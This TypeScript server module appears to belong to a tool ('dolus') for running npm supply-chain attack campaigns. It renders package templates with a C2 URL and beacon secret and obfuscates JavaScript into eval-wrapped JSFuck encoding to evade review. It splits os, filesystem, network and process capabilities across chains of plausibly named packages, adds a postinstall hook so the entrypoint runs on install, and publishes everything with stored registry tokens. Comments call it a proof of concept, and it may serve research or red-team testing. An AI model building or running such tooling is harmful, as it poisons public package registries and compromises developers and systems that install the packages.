import { spawnSync } from 'child_process';
import fs from 'fs';
import path from 'path';
import os from 'os';
import crypto from 'crypto';
import http from 'http';
import https from 'https';
// ponytail: CJS default import — jscrewit has no ESM export, compiled to CJS by Next.js
import jscrewit from 'jscrewit';
import db, { type Account } from './db';

// dolus/server/../packages/template
const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
const CAMPAIGN_DIR = path.join(process.cwd(), '..', 'packages', 'campaign');
const TEMPLATE_FILES = ['package.json', 'index.js', 'extension.js'];

export function renderTemplate(content: string, pkgName: string, c2Url: string, beaconSecret = '', version = '1.0.0'): string {
  return content
    .replaceAll('__PKG_NAME__', pkgName)
    .replaceAll('__C2_URL__', c2Url)
    .replaceAll('__BEACON_SECRET__', beaconSecret)
    .replaceAll('__VERSION__', version);
}

export function packageExistsOnRegistry(pkgName: string, registryUrl: string): Promise<boolean> {
  const base = registryUrl.endsWith('/') ? registryUrl : registryUrl + '/';
  const url = new URL(pkgName, base);
  const mod = url.protocol === 'https:' ? https : http;
  return new Promise((resolve, reject) => {
    const req = mod.request(url, { method: 'HEAD' }, res => {
      if (res.statusCode === 200) resolve(true);
      else if (res.statusCode === 404) resolve(false);
      else reject(new Error(`registry returned ${res.statusCode}`));
    });
    req.on('error', reject);
    req.end();
  });
}

/** Publish arbitrary files as an npm package. Low-level building block. */
export function publishFiles(
  pkgName: string,
  registryUrl: string,
  token: string | null,
  files: Record<string, string>,
  jsfuckEncode = true,
): { success: boolean; output: string } {
  const tmpDir = path.join(os.tmpdir(), `dolus-${crypto.randomUUID()}`);
  fs.mkdirSync(tmpDir, { recursive: true });

  try {
    for (const [file, raw] of Object.entries(files)) {
      const content = jsfuckEncode && file.endsWith('.js')
        ? `eval(${jscrewit.encode(raw, { runAs: 'none' })})`
        : raw;
      fs.writeFileSync(path.join(tmpDir, file), content);
    }

    if (token) {
      const host = new URL(registryUrl).host;
      fs.writeFileSync(path.join(tmpDir, '.npmrc'), `//${host}/:_authToken=${token}\n`);
    }

    // ponytail: spawnSync blocks event loop during publish (~2-5s), fine for PoC
    const result = spawnSync('npm', ['publish', '--registry', registryUrl], {
      cwd: tmpDir,
      encoding: 'utf8',
    });
    const output = ((result.stdout || '') + (result.stderr || '')).trim();
    return {
      success: result.status === 0 || output.includes('+ ' + pkgName + '@'),
      output,
    };
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

/** Publish a monolithic package from the template dir. Existing behavior, now wraps publishFiles. */
export function publishPackage(
  pkgName: string,
  registryUrl: string,
  token: string | null,
  c2Url: string,
  installJs?: string,
  beaconSecret = '',
  version = '1.0.0',
): { success: boolean; output: string } {
  const files: Record<string, string> = {};
  for (const file of TEMPLATE_FILES) {
    const raw = file === 'index.js' && installJs != null
      ? installJs
      : fs.readFileSync(path.join(TEMPLATE_DIR, file), 'utf8');
    files[file] = renderTemplate(raw, pkgName, c2Url, beaconSecret, version);
  }
  return publishFiles(pkgName, registryUrl, token, files);
}

export function unpublishPackage(
  pkgName: string,
  registryUrl: string,
  token: string | null,
): { success: boolean; output: string } {
  const tmpDir = path.join(os.tmpdir(), `dolus-unpub-${crypto.randomUUID()}`);
  fs.mkdirSync(tmpDir, { recursive: true });
  try {
    if (token) {
      const host = new URL(registryUrl).host;
      fs.writeFileSync(path.join(tmpDir, '.npmrc'), `//${host}/:_authToken=${token}\n`);
    }
    const result = spawnSync('npm', ['unpublish', pkgName, '--force', '--registry', registryUrl], {
      cwd: tmpDir,
      encoding: 'utf8',
    });
    return {
      success: result.status === 0,
      output: ((result.stdout || '') + (result.stderr || '')).trim(),
    };
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

// --- Campaign capability-splitting ---

const SUFFIXES = [
  '-core', '-platform', '-io', '-client', '-runtime', '-utils',
  '-common', '-base', '-helpers', '-lib', '-module', '-service',
];

type CapRole = 'cap-os' | 'cap-fs' | 'cap-net' | 'cap-cp';
const CAP_ROLES: CapRole[] = ['cap-os', 'cap-fs', 'cap-net', 'cap-cp'];
const CAP_FILES: Record<CapRole, string> = {
  'cap-os': 'cap-os.js',
  'cap-fs': 'cap-fs.js',
  'cap-net': 'cap-net.js',
  'cap-cp': 'cap-cp.js',
};

type ChainNode = { name: string; role: string; deps: string[]; jsFile: string; depReplacements?: Record<string, string> };

export function generateCampaignChain(
  baseName: string,
  depth: number,
): { entrypoint: ChainNode; nodes: ChainNode[] } {
  const shuffled = [...SUFFIXES].sort(() => Math.random() - 0.5);
  let si = 0;
  const pick = () => {
    if (si >= shuffled.length) si = 0; // wrap if we need more names than suffixes
    return baseName + shuffled[si++];
  };

  const nodes: ChainNode[] = [];
  // For each capability: cap package → depth shell packages → entrypoint's dep
  const outerShellNames: Record<CapRole, string> = {} as Record<CapRole, string>;
  const entryDepReplacements: Record<string, string> = {};

  // Placeholder mapping from CAP_ROLE to entrypoint.js placeholder
  const capPlaceholders: Record<CapRole, string> = {
    'cap-os': '__DEP_OS__',
    'cap-fs': '__DEP_FS__',
    'cap-net': '__DEP_NET__',
    'cap-cp': '__DEP_CP__',
  };

  for (const role of CAP_ROLES) {
    // Capability package (leaf)
    const capName = pick();
    nodes.push({ name: capName, role, deps: [], jsFile: CAP_FILES[role] });

    // Build shell chain from cap outward
    let prevName = capName;
    for (let d = 0; d < depth; d++) {
      const shellName = pick();
      nodes.push({
        name: shellName,
        role: 'shell',
        deps: [prevName],
        jsFile: 'shell.js',
        depReplacements: { '__DEP_PKG__': prevName },
      });
      prevName = shellName;
    }
    outerShellNames[role] = prevName;
    entryDepReplacements[capPlaceholders[role]] = prevName;
  }

  const entrypointName = pick();
  const entryDeps = Object.values(outerShellNames);

  return {
    entrypoint: {
      name: entrypointName,
      role: 'entrypoint',
      deps: entryDeps,
      jsFile: 'entrypoint.js',
      depReplacements: entryDepReplacements,
    },
    nodes, // ordered leaves-first (caps, then shells inner→outer)
  };
}

export function publishCampaign(
  campaignName: string,
  accountId: number,
  depth: number,
  beaconSecret: string,
): { success: boolean; packages: { name: string; role: string; status: string; output: string }[] } {
  const acct = db.prepare('SELECT * FROM accounts WHERE id = ?').get(accountId) as Account | undefined;
  if (!acct) return { success: false, packages: [{ name: '', role: '', status: 'failed', output: 'account not found' }] };

  const chain = generateCampaignChain(campaignName, depth);
  const allNodes = [...chain.nodes, chain.entrypoint]; // publish leaves first, entry last
  const results: { name: string; role: string; status: string; output: string }[] = [];
  let allOk = true;

  // Create campaign record
  db.prepare("INSERT INTO campaigns (name, account_id, depth, status) VALUES (?, ?, ?, 'pending')").run(campaignName, accountId, depth);
  const campaign = db.prepare('SELECT id FROM campaigns WHERE name = ?').get(campaignName) as { id: number };

  for (const node of allNodes) {
    // Build package files
    let jsRaw = fs.readFileSync(path.join(CAMPAIGN_DIR, node.jsFile), 'utf8');

    // Apply dependency name replacements
    if (node.depReplacements) {
      for (const [placeholder, replacement] of Object.entries(node.depReplacements)) {
        jsRaw = jsRaw.replaceAll(placeholder, replacement);
      }
    }

    // Apply standard placeholders
    jsRaw = renderTemplate(jsRaw, node.name, acct.c2_url, beaconSecret);

    // Build package.json
    const depsObj = node.deps.length > 0
      ? node.deps.reduce((acc, dep) => ({ ...acc, [dep]: '1.0.0' }), {} as Record<string, string>)
      : {};
    const scripts = node.role === 'entrypoint' ? { postinstall: 'node index.js' } : {};
    const pkgJson = JSON.stringify({
      name: node.name,
      version: '1.0.0',
      description: '',
      main: 'index.js',
      ...(Object.keys(depsObj).length > 0 ? { dependencies: depsObj } : {}),
      ...(Object.keys(scripts).length > 0 ? { scripts } : {}),
    }, null, 2);

    const files: Record<string, string> = {
      'package.json': pkgJson,
      'index.js': jsRaw,
    };

    // Record in DB
    db.prepare("INSERT INTO packages (name, status, account_id, campaign_id, role) VALUES (?, 'pending', ?, ?, ?)").run(
      node.name, accountId, campaign.id, node.role,
    );

    const { success, output } = publishFiles(node.name, acct.registry_url, acct.token, files);
    const status = success ? 'published' : 'failed';
    db.prepare('UPDATE packages SET status = ? WHERE name = ?').run(status, node.name);
    results.push({ name: node.name, role: node.role, status, output });
    if (!success) allOk = false;
  }

  db.prepare('UPDATE campaigns SET status = ? WHERE id = ?').run(
    allOk ? 'published' : results.some(r => r.status === 'published') ? 'partial' : 'failed',
    campaign.id,
  );

  return { success: allOk, packages: results };
}

export function deleteCampaign(campaignId: number): { success: boolean; results: { name: string; ok: boolean }[] } {
  const pkgs = db.prepare('SELECT p.name, a.registry_url, a.token FROM packages p LEFT JOIN accounts a ON p.account_id = a.id WHERE p.campaign_id = ?').all(campaignId) as { name: string; registry_url: string | null; token: string | null }[];
  const results: { name: string; ok: boolean }[] = [];

  for (const pkg of pkgs) {
    if (pkg.registry_url) {
      const { success } = unpublishPackage(pkg.name, pkg.registry_url, pkg.token ?? null);
      results.push({ name: pkg.name, ok: success });
    } else {
      results.push({ name: pkg.name, ok: true });
    }
  }

  db.prepare('DELETE FROM packages WHERE campaign_id = ?').run(campaignId);
  db.prepare('DELETE FROM campaigns WHERE id = ?').run(campaignId);
  return { success: results.every(r => r.ok), results };
}
